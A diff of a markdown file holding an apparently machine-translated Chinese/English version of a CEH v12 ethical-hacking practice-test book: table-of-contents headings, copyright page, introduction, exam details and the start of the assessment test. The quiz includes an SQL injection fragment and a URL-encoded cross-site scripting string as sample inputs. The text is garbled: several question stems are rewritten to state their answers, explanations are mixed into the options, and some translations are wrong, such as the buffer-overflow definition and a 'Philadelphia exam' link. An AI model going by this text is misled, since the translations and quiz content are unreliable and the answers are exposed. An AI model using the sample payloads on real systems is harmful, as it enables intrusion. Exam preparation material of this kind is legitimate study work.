@@ -1,12 +1,7 @@
-# 
-CEH v12 认证伦理黑客学习指南 750 个练习题（Sybex 学习指南）
 
-
-![](img/9781394186914.jpg)
+# CEH v12 认证伦理黑客学习指南 750 个练习题（Sybex 学习指南）
 
 ![](img/9781394186914.jpg)
-
-
 
 ## 121. 102
 
@@ -75,8 +70,6 @@ CEH v12 认证伦理黑客学习指南 750 个练习题（Sybex 学习指南）
 ## 153. 134
 
 ## 154. 135
-
-## 155. 136
 
 ## 156. 137
 
@@ -260,245 +253,475 @@ CEH v12 认证伦理黑客学习指南 750 个练习题（Sybex 学习指南）
 
 ## 245. 227
 
-
-
 ## 246. 228
+
 ## 247. 229
+
 ## 248. 231
+
 ## 249. 232
+
 ## 250. 233
+
 ## 251. 234
+
 ## 252. 235
+
 ## 253. 236
+
 ## 254. 237
+
 ## 255. 238
+
 ## 256. 239
+
 ## 257. 240
+
 ## 258. 241
+
 ## 259. 242
+
 ## 260. 243
+
 ## 261. 244
+
 ## 262. 245
+
 ## 263. 246
+
 ## 264. 247
+
 ## 265. 248
+
 ## 266. 249
+
 ## 267. 250
+
 ## 268. 251
+
 ## 269. 252
+
 ## 270. 253
+
 ## 271. 254
+
 ## 272. 255
+
 ## 273. 256
+
 ## 274. 257
+
 ## 275. 258
+
 ## 276. 259
+
 ## 277. 260
+
 ## 278. 261
+
 ## 279. 262
+
 ## 280. 263
+
 ## 281. 264
+
 ## 282. 265
+
 ## 283. 266
+
 ## 284. 267
+
 ## 285. 268
+
 ## 286. 269
+
 ## 287. 270
+
 ## 288. 271
+
 ## 289. 272
+
 ## 290. 273
+
 ## 291. 274
+
 ## 292. 275
+
 ## 293. 276
+
 ## 294. 277
+
 ## 295. 279
+
 ## 296. 280
+
 ## 297. 281
+
 ## 298. 282
+
 ## 299. 283
+
 ## 300. 284
+
 ## 301. 285
+
 ## 302. 286
+
 ## 303. 287
+
 ## 304. 288
+
 ## 305. 289
+
 ## 306. 290
+
 ## 307. 291
+
 ## 308. 292
+
 ## 309. 293
+
 ## 310. 294
+
 ## 311. 295
+
 ## 312. 296
+
 ## 313. 297
+
 ## 314. 298
+
 ## 315. 299
+
 ## 316. 300
+
 ## 317. 301
+
 ## 318. 302
+
 ## 319. 303
+
 ## 320. 304
+
 ## 321. 305
+
 ## 322. 306
+
 ## 323. 307
+
 ## 324. 308
+
 ## 325. 309
+
 ## 326. 310
+
 ## 327. 311
+
 ## 328. 312
+
 ## 329. 313
+
 ## 330. 314
+
 ## 331. 315
+
 ## 332. 316
+
 ## 333. 317
+
 ## 334. 318
+
 ## 335. 319
+
 ## 336. 320
+
 ## 337. 321
+
 ## 338. 322
+
 ## 339. 323
+
 ## 340. 324
+
 ## 341. 325
+
 ## 342. 326
+
 ## 343. 327
+
 ## 344. 328
+
 ## 345. 329
+
 ## 346. 330
+
 ## 347. 331
+
 ## 348. 332
+
 ## 349. 333
+
 ## 350. 334
+
 ## 351. 335
+
 ## 352. 336
+
 ## 353. 337
+
 ## 354. 339
+
 ## 355. 340
+
 ## 356. 341
+
 ## 357. 342
+
 ## 358. 343
+
 ## 359. 344
+
 ## 360. 345
+
 ## 361. 346
+
 ## 362. 347
+
 ## 363. 348
+
 ## 364. 349
+
 ## 365. 350
+
 ## 366. 351
+
 ## 367. 352
+
 ## 368. 353
+
 ## 369. 354
+
 ## 370. 355
+
 ## 371. 356
+
 ## 372. 357
+
 ## 373. 358
+
 ## 374. 359
+
 ## 375. 360
+
 ## 376. 361
+
 ## 377. 362
+
 ## 378. 363
+
 ## 379. 364
+
 ## 380. 365
+
 ## 381. 366
+
 ## 382. 367
+
 ## 383. 368
+
 ## 384. 369
+
 ## 385. 370
+
 ## 386. 371
+
 ## 387. 372
+
 ## 388. 373
+
 ## 389. 374
+
 ## 390. 375
+
 ## 391. 376
+
 ## 392. 377
+
 ## 393. 378
+
 ## 394. 379
+
 ## 395. 380
+
 ## 396. 381
+
 ## 397. 382
+
 ## 398. 383
+
 ## 399. 384
+
 ## 400. 385
+
 ## 401. 386
+
 ## 402. 387
+
 ## 403. 388
+
 ## 404. 389
+
 ## 405. 390
+
 ## 406. 391
+
 ## 407. 393
+
 ## 408. 394
+
 ## 409. 395
+
 ## 410. 396
+
 ## 411. 397
+
 ## 412. 398
+
 ## 413. 399
+
 ## 414. 400
+
 ## 415. 401
+
 ## 416. 402
+
 ## 417. 403
+
 ## 418. 404
+
 ## 419. 405
+
 ## 420. 406
+
 ## 421. 407
+
 ## 422. 408
+
 ## 423. 409
+
 ## 424. 410
+
 ## 425. 411
+
 ## 426. 412
+
 ## 427. 413
+
 ## 428. 414
+
 ## 429. 415
+
 ## 430. 416
+
 ## 431. 417
+
 ## 432. 418
+
 ## 433. 419
+
 ## 434. 420
+
 ## 435. 421
+
 ## 436. 422
+
 ## 437. 423
+
 ## 438. 424
+
 ## 439. 425
+
 ## 440. 426
+
 ## 441. 427
+
 ## 442. 428
+
 ## 443. 429
+
 ## 444. 430
+
 ## 445. 431
+
 ## 446. 432
+
 ## 447. 433
+
 ## 448. 434
+
 ## 449. 435
+
 ## 450. 436
+
 ## 451. 437
+
 ## 452. 438
+
 ## 453. 439
+
 ## 454. 440
+
 ## 455. 441
+
 ## 456. 442
+
 ## 457. 443
+
 ## 458. 444
+
 ## 459. 445
+
 ## 460. 446
+
 ## 461. 447
+
 ## 462. 448
+
 ## 463. 449
+
 ## 464. 450
+
 ## 465. 451
+
 ## 466. 452
+
 ## 467. 453
+
 ## 468. 454
+
 ## 469. 455
+
 ## 470. 456
+
 ## 471. 457
+
 ## 472. 458
+
 ## 473. 459
+
 ## 474. 460
+
 ## 475. 461
+
 ## 476. 462
+
 ## 477. 463
+
 ## 478. 464
+
 ## 479. 465
+
 ## 480. 466
-
-
 
 ## 481. 467
 
@@ -974,31 +1197,31 @@ CEH v12 认证伦理黑客学习指南 750 个练习题（Sybex 学习指南）
 
 ## 716. 704
 
+## 716. 705
+
+## 717. 706
+
+## 718. 707
+
+## 719. 708
+
+## 720. 709
+
+## 721. 710
+
+## 722. 711
+
+## 723. 712
+
+## 724. 713
+
+## 725. 714
+
+## 726. 715
+
+## 727. 716
 
 
-716. 705
-
-717. 706
-
-718. 707
-
-719. 708
-
-720. 709
-
-721. 710
-
-722. 711
-
-723. 712
-
-724. 713
-
-725. 714
-
-726. 715
-
-727. 716
 
 728. 717
 
@@ -1024,19 +1247,19 @@ CEH v12 认证伦理黑客学习指南 750 个练习题（Sybex 学习指南）
 
 Copyright © 2023 by John Wiley & Sons, Inc. All rights reserved.
 
-Published by John Wiley & Sons, Inc., Hoboken, New Jersey.  
+Published by John Wiley & Sons, Inc., Hoboken, New Jersey.
 
 Published simultaneously in Canada and the United Kingdom.
 
-ISBN: 978-1-394-18692-1  
+ISBN: 978-1-394-18692-1
 
-ISBN: 978-1-394-18687-7 (ebk.)  
+ISBN: 978-1-394-18687-7 (ebk.)
 
 ISBN: 978-1-394-18691-4 (ebk.)
 
 No part of this publication may be reproduced, stored in a retrieval system, or transmitted in any form or by any means, electronic, mechanical, photocopying, recording, scanning, or otherwise, except as permitted under Section 107 or 108 of the 1976 United States Copyright Act, without either the prior written permission of the Publisher, or authorization through payment of the appropriate per‑copy fee to the Copyright Clearance Center, Inc., 222 Rosewood Drive, Danvers, MA 01923, (978) 750‑8400, fax (978) 750‑4470, or on the web at `www.copyright.com`. Requests to the Publisher for permission should be addressed to the Permissions Department, John Wiley & Sons, Inc., 111 River Street, Hoboken, NJ 07030, (201) 748‑6011, fax (201) 748‑6008, or online at `www.wiley.com/go/permission`.
 
-**Trademarks:** WILEY, the Wiley logo, and the Sybex logo are trademarks or registered trademarks of John Wiley & Sons, Inc. and/or its affiliates, in the United States and other countries, and may not be used without written permission. CEH is a trademark of EC‑Council. All other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not associated with any product or vendor mentioned in this book.
+**Trademarks:** `WILEY`, the `Wiley` logo, and the `Sybex` logo are trademarks or registered trademarks of John Wiley & Sons, Inc. and/or its affiliates, in the United States and other countries, and may not be used without written permission. `CEH` is a trademark of EC‑Council. All other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not associated with any product or vendor mentioned in this book.
 
 **Limit of Liability/Disclaimer of Warranty:** While the publisher and author have used their best efforts in preparing this book, they make no representations or warranties with respect to the accuracy or completeness of the contents of this book and specifically disclaim any implied warranties of merchantability or fitness for a particular purpose. No warranty may be created or extended by sales representatives or written sales materials. The advice and strategies contained herein may not be suitable for your situation. You should consult with a professional where appropriate. Further, readers should be aware that websites listed in this work may have changed or disappeared between when this work was written and when it is read. Neither the publisher nor author shall be liable for any loss of profit or any other commercial damages, including but not limited to special, incidental, consequential, or other damages.
 
@@ -1046,7 +1269,7 @@ Wiley also publishes its books in a variety of electronic formats. Some content 
 
 **Library of Congress Control Number:** 2023932588
 
-Cover image: © Getty Images Inc./Jeremy Woodhouse  
+Cover image: © Getty Images Inc./Jeremy Woodhouse
 
 Cover design: Wiley
 
@@ -1060,61 +1283,62 @@ Cover design: Wiley
 
 # Introduction
 
-You're thinking about becoming a Certified Ethical Hacker (CEH). No matter what variation of security testing you are performing—ethical hacking, penetration testing, red teaming, or application assessment—the skills and knowledge necessary to achieve this certification are in demand. Even the idea of security testing and ethical hacking is evolving as businesses and organizations begin to have a better understanding of the adversaries they are facing. It's no longer the so‑called script kiddies that businesses felt they were fending off for so long. Today's adversary is organized, well‑funded, and determined. This means testing requires different tactics.
+You're thinking about becoming a Certified Ethical Hacker (`CEH`). No matter what variation of security testing you are performing—ethical hacking, penetration testing, red teaming, or application assessment—the skills and knowledge necessary to achieve this certification are in demand. Even the idea of security testing and ethical hacking is evolving as businesses and organizations begin to have a better understanding of the adversaries they are facing. It's no longer the so‑called script kiddies that businesses felt they were fending off for so long. Today's adversary is organized, well‑funded, and determined. This means testing requires different tactics.
 
 Depending on who you are listening to, 80–90 percent of attacks today use social engineering. The old technique of looking for technical vulnerabilities in network services is simply not how attackers are getting into networks. Networks that are focused on applying a defense‑in‑depth approach, hardening the outside, may end up being susceptible to attacks from the inside, which is what happens when desktop systems are compromised. The skills needed to identify vulnerabilities and recommend remediations are evolving, along with the tactics and techniques used by attackers.
 
-This book is written to help you understand the breadth of content you will need to know to obtain the CEH certification. You will find a lot of concepts to provide you with a foundation that can be applied to the skills required for the certification. While you can read this book cover to cover, for a substantial chunk of the subjects, getting hands‑on experience is essential. The concepts are often demonstrated through the use of tools. Following along with these demonstrations and using the tools yourself will help you understand the tools and how to use them. Many of the demonstrations are done in Kali Linux, though many of the tools have Windows analogs if you are more comfortable there.
+This book is written to help you understand the breadth of content you will need to know to obtain the `CEH` certification. You will find a lot of concepts to provide you with a foundation that can be applied to the skills required for the certification. While you can read this book cover to cover, for a substantial chunk of the subjects, getting hands‑on experience is essential. The concepts are often demonstrated through the use of tools. Following along with these demonstrations and using the tools yourself will help you understand the tools and how to use them. Many of the demonstrations are done in Kali Linux, though many of the tools have Windows analogs if you are more comfortable there.
 
 We can't get through this without talking about ethics, though you will find it mentioned in several places throughout the book. This is serious, and not only because it's a huge part of the basis for the certification. It's also essential for protecting yourself and the people you are working for. The short version is do not do anything that would cause damage to systems or your employer. There is much more to it than that, which you'll read more about in Chapter 1, “Ethical Hacking,” as a starting point. It's necessary to start wrapping your head around the ethics involved in this exam and profession. You will have to sign an agreement as part of achieving your certification.
-
-
-
 
 在每个章节的末尾，您会发现一组问题。这将帮助您向自己证明您已理解所学内容。大多数问题都是选择题，这是 CEH 考试所使用的题目格式。结合您获得的实践经验，这些问题将为参加考试做好良好准备。
 
 ## 什么是 CEH？
 
-认证伦理黑客（CEH）考试用于验证持有认证的人员是否具备成为有效伦理黑客所需的广泛知识领域。事实是，大多数天数，如果您留意新闻，您会看到一家公司因数据被盗而被入侵的新闻报道，或是政府遭受攻击，甚至是大规模的拒绝服务攻击，导致用户难以访问业务资源。
+认证伦理黑客（`CEH`）考试用于验证持有认证的人员是否具备成为有效伦理黑客所需的广泛知识领域。事实是，大多数天数，如果您留意新闻，您会看到一家公司因数据被盗而被入侵的新闻报道，或是政府遭受攻击，甚至是大规模的拒绝服务攻击，导致用户难以访问业务资源。
 
-CEH 是一项认证，旨在体现识别安全问题并加以整改的重要性。这是公司防范攻击的一种方式——在攻击者之前发现并修复漏洞。这需要具备了解攻击者通常使用的技术的专业人员。仅靠自动化工具进行扫描是不够的，因为即使安全扫描仪相当出色，也会产生误报——即扫描仪错误地指示不存在的问题。此外，它们还会漏掉许多漏洞（即假阴性），原因有多种，包括漏洞或攻击本身可能尚未被知晓。
+`CEH` 是一项认证，旨在体现识别安全问题并加以整改的重要性。这是公司防范攻击的一种方式——在攻击者之前发现并修复漏洞。这需要具备了解攻击者通常使用的技术的专业人员。仅靠自动化工具进行扫描是不够的，因为即使安全扫描仪相当出色，也会产生误报——即扫描仪错误地指示不存在的问题。此外，它们还会漏掉许多漏洞（即假阴性），原因有多种，包括漏洞或攻击本身可能尚未被知晓。
 
 由于公司需要了解自身的攻击面，他们需要能够发现这些漏洞的人，而这往往非常复杂。扫描工具是一个良好的起点，但要在复杂网络中找到漏洞需要人类创造性的智慧。因此我们需要伦理黑客 —  — 能够运用广泛的技术知识来识别可被利用的漏洞的人。
 
 “伦理”这两个字的关键意义在于，企业有保护措施，因为它们不希望其资源被窃取或损坏。当公司聘请一位寻找漏洞的专业人士时，必须确保不会有资源被窃取或损坏，同时确保任何被观察或审查的内容不被向他人泄露。尤其是在发现漏洞后，这一点尤为重要。
 
+
+
+# CEH 考试概述
+
 CEH 考试具有双重目的。它不仅考察深度技术知识，还将持有认证者约束在行为守则下。您不仅需要了解该守则的内容和期望，还必须在实际工作中遵守它。当公司招聘或委托持有 CEH 认证的人员时，他们可以确信已雇佣了一位 discretion（保密）且可靠的人，能够保护公司的秘密，并提供专业服务，帮助提升安全态势，保护重要资源。
 
-### 主要知识领域
+## 主要知识领域
 
 如果您参加 CEH v12 培训，将需要完成以下模块：
 
-*   伦理黑客概述  
-*   足迹收集与侦察  
-*   网络扫描  
-*   端口枚举  
-*   漏洞分析  
-*   系统入侵  
-*   恶意软件威胁  
-*    sniffing（数据包捕获）  
-*   社会工程学  
-*   拒绝服务攻击  
-*   会话劫持  
-*   规避 IDS、防火墙和蜜罐  
-*   Web 服务器入侵  
-*   Web 应用入侵  
-*   SQL 注入  
-*   无线网络入侵  
-*   移动平台入侵  
-*   IoT 与 OT（运营技术）入侵  
-*   云计算  
-*   加密学  
+* 伦理黑客概述
+* 足迹收集与侦察
+* 网络扫描
+* 端口枚举
+* 漏洞分析
+* 系统入侵
+* 恶意软件威胁
+* sniffing（数据包捕获）
+* 社会工程学
+* 拒绝服务攻击
+* 会话劫持
+* 规避 IDS、防火墙和蜜罐
+* Web 服务器入侵
+* Web 应用入侵
+* SQL 注入
+* 无线网络入侵
+* 移动平台入侵
+* IoT 与 OT（运营技术）入侵
+* 云计算
+* 加密学
 
 如您所见，涉及的范围非常广泛。除了了解这些主题相关的概念外，您还需要熟悉在执行相关操作时可能使用的各种工具。您需要了解诸如 `nmap` 等用于端口扫描的工具。对于基于代理的 Web 应用攻击工具，也可能需要了解。在无线网络攻击方面，可能需要掌握 `aircrack-ng` 套件。每个列出的模块中，可能都有数十种可用的工具。
 
 CEH 考试的知识领域非常技术化。这不是一个仅凭理论知识就能行之有效的领域。您必须已经使用过文中涵盖的方法和工具，并具备实际操作经验。您可能已经注意到，这些模块都对应于前文提到的不同阶段。虽然考试可能不会要求您针对特定方法进行回答，但考试内容大体上遵循 EC‑Council 所认可的标准方法论。
 
-### 关于考试
+## 关于考试
 
 CEH 考试的参数与其他专业认证考试相似。您将参加一场受监考的电脑考试，时长 4 小时，需回答 125 道选择题。这意味着平均每题约 2 分钟的作答时间。考试可通过 ECC Exam Center 或 Pearson VUE 中心进行。关于 VUE 的详细信息，请访问 `https://home.pearsonvue.com/eccouncil`。
 
@@ -1124,455 +1348,405 @@ CEH 考试的参数与其他专业认证考试相似。您将参加一场受监�
 
 好消息是，您在离开考场前即可得知是否通过。考试结束后会即时显示您的得分，并提供一份纸质文件，列明成绩细节。您还会收到各个评分区域的反馈，说明您在每个方面的表现。
 
-### 适用人群
+## 适用人群
 
 并非所有人都有资格参加 CEH 考试。在深入之前，请确认您的资格。作为起点，您必须年满 18 岁。其他资格标准如下：
 
-*   持有 CEH 版本 1–7 的认证人员。虽然 CEH 认证已获得 ANSI 认证，但早期版本的考试在认证之前即已提供。持有早期 CEH 认证的人员可报考 ANSI 认证的 CEH 考试。
-
-*   至少两年相关工作经验。具备此经验的人员需缴纳不可退还的 100 美元申请费。
-
-*   已完成 EC‑Council 培训。
+* 持有 CEH 版本 1–7 的认证人员。虽然 CEH 认证已获得 ANSI 认证，但早期版本的考试在认证之前即已提供。持有早期 CEH 认证的人员可报考 ANSI 认证的 CEH 考试。
+* 至少两年相关工作经验。具备此经验的人员需缴纳不可退还的 100 美元申请费。
+* 已完成 EC‑Council 培训。
 
 如果您满足上述资格标准，即可提交申请，并在适用的情况下缴纳费用（如果您参加了 EC‑Council 培训，费用已包含）。申请有效期为三个月。
 
-### 考试费用
+## 考试费用
 
+* [费城考试](https://www.example.org/pearson-vue-exam-voucher)的费用为 `$1,199`。你也可以获得 EC‑Council 的考试券，价格为 `$950`，但这需要你已参加 EC‑Council 培训并提供出席证明。
 
-
-
--   [费城考试](https://www.example.org/pearson-vue-exam-voucher)的费用为$1,199。你也可以获得 EC‑Council 的考试券，价格为$950，但这需要你已参加 EC‑Council 培训并提供出席证明。
-
-## About EC‑Council
+# About EC‑Council
 
 The International Council of Electronic Commerce Consultants 通常被称为 EC‑Council (`www.eccouncil.org`)。它是在 2001 年 9 月 11 日美国遭受飞机袭击之后创建的。创始人 Jay Bavisi 想象如果攻击者把攻击方式从物理世界转移到数字世界会发生什么。除了这些特定的攻击者之外，互联网已成为大量想要造成破坏或窃取信息的人的活动场所。互联网的低成本进入门槛鼓励犯罪分子将其用于窃取信息、勒索数据或其他恶意行为。
 
 EC‑Council 被认为是全球最大的认证机构之一。它在 145 个国家运营，已认证超过 200,000 人。除了 CEH，EC‑Council 还管理多个与 IT 相关的认证：
 
-*   Certified Network Defender (CND)
-
-*   Certified Ethical Hacker Practical
-
-*   EC‑Council Certified Security Analyst (ECSA)
-
-*   EC‑Council Certified Security Analyst Practical
-
-*   Licensed Penetration Tester (LPT)
-
-*   Computer Hacking Forensic Investigator (CHFI)
-
-*   Certified Chief Information Security Officer (CCISO)
+* Certified Network Defender (CND)
+* Certified Ethical Hacker Practical
+* EC‑Council Certified Security Analyst (ECSA)
+* EC‑Council Certified Security Analyst Practical
+* Licensed Penetration Tester (LPT)
+* Computer Hacking Forensic Investigator (CHFI)
+* Certified Chief Information Security Officer (CCISO)
 
 持有 EC‑Council 认证的一个优势是该组织已获得美国国家标准化协会 (ANSI) 的认证。此外，也许更为重要，EC‑Council 的认证在全球得到认可，并得到像国家安全局 (NSA) 等政府机构的支持。国防部指令 8570 包含 CEH 认证。这很重要，因为拥有 CEH 认证意味着你可以快速获得美国政府若干职位的资格。
 
 CEH 认证设立了一个标准，即有明确的已知标准集合。要获得认证，你必须满足至少最低标准。这些标准可以持续依赖。因此，拥有 CEH 认证的人可以被信任，他们已经证明自己达到了已知且被接受的知识和职业行为标准。
 
-## Using This Book
+# Using This Book
 
 本书的结构是将基础材料放在前面。通过这种方式，你可以按章节有序地阅读全书。技术书籍有时会枯燥且难以阅读，但我的目标始终是让它们易读且富有乐趣。如果你已经拥有大量经验，不必从头到尾直接阅读。你可以根据需要跳转阅读。没有任何章节依赖于其他章节，它们在内容上相互独立。然而，如果你缺乏基础却跳到后面的章节，可能会感到迷茫或困惑。只需回到相应的基础章节即可。
 
 在基础材料之外，本书大致遵循安全测试的标准方法论。该方法论将在 Chapter 1 中进一步说明。因此，你可以按照渗透测试/伦理黑客攻击的步骤进行操作。了解方法论的大纲和原因也会对你有帮助。不过，如果你已经熟悉材料，也可以随意跳转。
 
-### Additional Study Tools
+## Additional Study Tools
 
 本书配有在线学习环境，提供多种额外元素。以下项目在伴随文件中可供使用：
 
-*   **Practice tests**    本书的所有问题均在专有的数字测试引擎中提供，包括本介绍末尾的 30 道评估题以及每章末尾的 100+ 题复习题。此外，还有四份额外考试，每份 125 题。
-
-*   **Electronic “flashcards”**    数字伴随文件中包含超过 100 条闪卡格式的题目（一个问题后跟一个正确答案）。你可以使用这些闪卡复习考试目标。
-
-*   **Glossary**    本书的关键术语及其定义以可完全搜索的 PDF 形式提供。
+* **Practice tests** 本书的所有问题均在专有的数字测试引擎中提供，包括本介绍末尾的 30 道评估题以及每章末尾的 100+ 题复习题。此外，还有四份额外考试，每份 125 题。
+* **Electronic “flashcards”** 数字伴随文件中包含超过 100 条闪卡格式的题目（一个问题后跟一个正确答案）。你可以使用这些闪卡复习考试目标。
+* **Glossary** 本书的关键术语及其定义以可完全搜索的 PDF 形式提供。
 
 ## Objective Map
 
 Table 1.1 显示了在书中何处可以找到每个目标的概览。虽然所有目标都有对应的章节，但有些目标分布在全书的多个章节中。具体来说，工具、系统和程序在大多数章节中至少会被提及。
 
-**TABLE 1.1**  **Objective Map**
+**TABLE 1.1 Objective Map**
 
-| Objective || Chapter |
+| Objective | Chapter |
 | --- | --- |
-| **Tasks** || |
-| 1.1 Systems development and management || 7, 14 |
-| 1.2 Systems analysis and audits || 4, 5, 6, 7 |
-| 1.3 Security testing and vulnerabilities || 7, 8 |
-| 1.4 Reporting || 1, 7 |
-| 1.5 Mitigation || 7, 8 |
-| 1.6 Ethics || 1 |
-| **Knowledge** || |
-| 2.1 Background || 2, 3 |
-| 2.2 Analysis/assessment || 2, 11 |
-| 2.3 Security || 3, 13, 14 |
-| 2.4 Tools, systems, programs || 4, 5, 6, 7 |
-| 2.5 Procedures/methodology || 1, 4, 5, 6, 7, 14 |
-| 2.6 Regulation/policy || 1, 14 |
-| 2.7 Ethics || 1 |
+| **Tasks** | |
+| 1.1 Systems development and management | 7, 14 |
+| 1.2 Systems analysis and audits | 4, 5, 6, 7 |
+| 1.3 Security testing and vulnerabilities | 7, 8 |
+| 1.4 Reporting | 1, 7 |
+| 1.5 Mitigation | 7, 8 |
+| 1.6 Ethics | 1 |
+| **Knowledge** | |
+| 2.1 Background | 2, 3 |
+| 2.2 Analysis/assessment | 2, 11 |
+| 2.3 Security | 3, 13, 14 |
+| 2.4 Tools, systems, programs | 4, 5, 6, 7 |
+| 2.5 Procedures/methodology | 1, 4, 5, 6, 7, 14 |
+| 2.6 Regulation/policy | 1, 14 |
+| 2.7 Ethics | 1 |
 
-## Let's Get Started!
+# Let's Get Started!
 
 本书的结构是先带你学习基础概念，再逐步介绍伦理黑客攻击的通用方法论。你可以自行选择阅读路径。记住，尽可能动手实践。尝试使用工具、战术和程序，尤其是那些你不太熟悉的，这将对你帮助很大。
 
 完成自评测。它可能帮助你更好地了解如何高效使用本书。
 
-## How to Contact the Publisher
+# How to Contact the Publisher
 
 如果你发现本书有错误，请联系我们。在 John Wiley & Sons，我们认识到提供准确内容的重要性，尽管我们尽力而为，错误仍可能发生。
 
 若要提交可能的 errata，请将电子邮件发送至客服团队 `wileysupport@wiley.com`，主题行写为 “Possible Book Errata Submission”。
 
-## Assessment Test
+# Assessment Test
 
-1.  哪个字段用于重新组装碎片化的 IP 包？
+1. 哪个字段用于重新组装碎片化的 IP 包？
 
-    1.  目的地址  
-    2.  IP 标识  
-    3.  不分片位  
-    4.  ToS 字段  
+   1. 目的地址
+   2. IP 标识
+   3. 不分片位
+   4. ToS 字段
 
-2.  如果在数据包捕获中看到下面内容，你会预期发生什么？
+2. 如果在数据包捕获中看到下面内容，你会预期发生什么？
 
-    ```
-    ' or 1=1;
-    ```
+   ```
+   ' or 1=1;
+   ```
 
-    1.  跨站脚本  
-    2.  命令注入  
-    3.  SQL 注入  
-    4.  XML 外部实体注入  
+   1. 跨站脚本
+   2. 命令注入
+   3. SQL 注入
+   4. XML 外部实体注入
 
-3.  哪种方法可能让你成功将恶意软件安装到移动设备上？
+3. 哪种方法可能让你成功将恶意软件安装到移动设备上？
 
-    1.  通过 Apple Store 或 Google Play Store  
-    2.  Android 外部存储  
-    3.  第三方应用商店  
-    4.  越狱  
+   1. 通过 Apple Store 或 Google Play Store
+   2. Android 外部存储
+   3. 第三方应用商店
+   4. 越狱
 
-4.  哪种协议用于将目的 IP 地址映射到本地网络上的目的地址并发送数据包？
+4. 哪种协议用于将目的 IP 地址映射到本地网络上的目的地址并发送数据包？
 
-    1.  DHCP
+   1. DHCP
+   2. [ARP]的缩写是 `Address Resolution Protocol`，它用于在本地网络中将 `IP 地址` 映射到 `MAC 地址`。
+   3. [DNS]的缩写是 `Domain Name System`，它负责在因特网上将 `域名` 转换为 `IP 地址`。
+   4. [RARP]的缩写是 `Reverse Address Resolution Protocol`，它用于将 `MAC 地址` 解析为 `IP 地址`。
 
+5. 将包含 `AAAAAAAAAAAAAAAA`（共 16 个字符）的字符串写入只分配了 `8 字节` 内存空间会导致 `缓冲区溢出（Buffer overflow）`，因为数据超出了分配的存储空间，可能覆盖相邻的内存。
 
+   1. [Heap spraying]是一种通过大量分配内存来填充堆区的技术，常用于绕过防护机制。
+   2. [SQL injection]是通过在输入中注入恶意的 SQL 语句，以此操控数据库后端的攻击手段。
+   3. [Buffer overflow]是指向量超出其预期的长度，导致内存被破坏或执行任意代码的漏洞。
+   4. [Slowloris attack]是一种通过长时间打开少量连接，占用服务器资源从而导致服务不可用的拒绝服务攻击。
 
--   [ARP]的缩写是 **Address Resolution Protocol**，它用于在本地网络中将 **IP 地址** 映射到 **MAC 地址**。
+6. 子网掩码 `255.255.248.0` 对应的 CIDR 前缀是 `/21`。
 
-3. [DNS]的缩写是 **Domain Name System**，它负责在因特网上将 **域名** 转换为 **IP 地址**。
+   1. [/23]是错误的，因为它只覆盖了 23 位，掩码长度不匹配。
+   2. [/22]是错误的，掩码长度为 22 位，范围不匹配。
+   3. [/21]是正确的，掩码长度为 21 位，正好对应 255.255.248.0。
+   4. [/20]是错误的，掩码长度为 20 位，范围不匹配。
 
-4. [RARP]的缩写是 **Reverse Address Resolution Protocol**，它用于将 **MAC 地址** 解析为 **IP 地址**。
+7. 蠕虫（worm）与病毒（virus）的主要区别在于 `蠕虫可以自行传播`，而病毒通常需要宿主文件或程序作为载体。
 
-5. 将包含 **AAAAAAAAAAAAAAAA**（共 16 个字符）的字符串写入只分配了 **8 字节** 内存空间会导致 **缓冲区溢出（Buffer overflow）**，因为数据超出了分配的存储空间，可能覆盖相邻的内存。
+   1. [A worm uses polymorphic code]是错误的，蠕虫不一定使用多态代码。
+   2. [A virus uses polymorphic code]是错误的，虽然病毒可能使用多态代码，但这并不是两者的根本区别。
+   3. [A worm can self‑propagate]是正确的，蠕虫能够自行在网络中传播。
+   4. [A virus can self‑propagate]是错误的，病毒需要借助其他程序或文件传播。
 
-1. [Heap spraying]是一种通过大量分配内存来填充堆区的技术，常用于绕过防护机制。
+8. 计算风险的常用公式是 `Probability × Loss`（即概率乘以潜在损失）。
 
-2. [SQL injection]是通过在输入中注入恶意的 SQL 语句，以此操控数据库后端的攻击手段。
+   1. [Probability * loss]是正确的。
+   2. [Probability * mitigation factor]是错误的，因为它引入了缓解因子，而不是直接的损失。
+   3. [(Loss + mitigation factor) * (loss/probability)]是错误的，公式不合逻辑。
+   4. [Loss * mitigation factor]是错误的，缺少概率因子。
 
-3. [Buffer overflow]是指向量超出其预期的长度，导致内存被破坏或执行任意代码的漏洞。
+9. 恶意双子（evil twin）攻击的工作方式是 `冒充合法的无线接入点（AP）`，诱骗用户连接到攻击者控制的 AP，从而可以拦截或篡改流量。
 
-4. [Slowloris attack]是一种通过长时间打开少量连接，占用服务器资源从而导致服务不可用的拒绝服务攻击。
+   1. [Phishing users for credentials]是错误的，这是钓鱼攻击，不是双子攻击。
+   2. [Spoofing an SSID]是正确的，攻击者伪装 AP 的 SSID 以误导用户。
+   3. [Changing an SSID]是错误的，单纯更改 SSID 并不能实现双子攻击。
+   4. [Injecting four‑way handshakes]是错误的，这与攻击的核心机制无关。
 
-6. 子网掩码 **255.255.248.0** 对应的 CIDR 前缀是 **/21**。
+10. 在端点之前、网络层面清除恶意软件的常用手段是 `统一威胁管理（Unified threat management）设备`。
 
-1. [/23]是错误的，因为它只覆盖了 23 位，掩码长度不匹配。
+    1. [Antivirus]是错误的，它主要在终端层面工作。
+    2. [Application layer gateway]是错误的，它主要处理应用层流量，而非网络层恶意软件清除。
+    3. [Unified threat management appliance]是正确的，它集成了防火墙、入侵防御等功能，可在网络层面阻断恶意软件。
+    4. [Stateful firewall]是错误的，它只能基于连接状态过滤流量，无法主动清除恶意软件。
 
-2. [/22]是错误的，掩码长度为 22 位，范围不匹配。
+11. 安全策略的主要目的是 `为安全提供高层次的指导`，帮助组织制定整体的安全方针和原则。
 
-3. [/21]是正确的，掩码长度为 21 位，正好对应 255.255.248.0。
+    1. [Providing high‑level guidance on the role of security]是正确的。
+    2. [Providing specific direction to security workers]是错误的，这是详细操作指南，而非策略的主要目的。
+    3. [Increasing the bottom line of a company]是错误的，安全策略的核心不是财务增长。
+    4. [Aligning standards and practices]是错误的，虽然对齐很重要，但不是策略的首要目的。
 
-4. [/20]是错误的，掩码长度为 20 位，范围不匹配。
+12. 给定的字符串 `%3Cscript%3Ealert('wubble');%3C/script%3E` 是 `URL 编码`（percent‑encoding）后的形式，其中 `%3C` 代表 `<`，`%3E` 代表 `>`，`%3E` 后面的部分是被编码的脚本代码。
 
-7. 蠕虫（worm）与病毒（virus）的主要区别在于 **蠕虫可以自行传播**，而病毒通常需要宿主文件或程序作为载体。
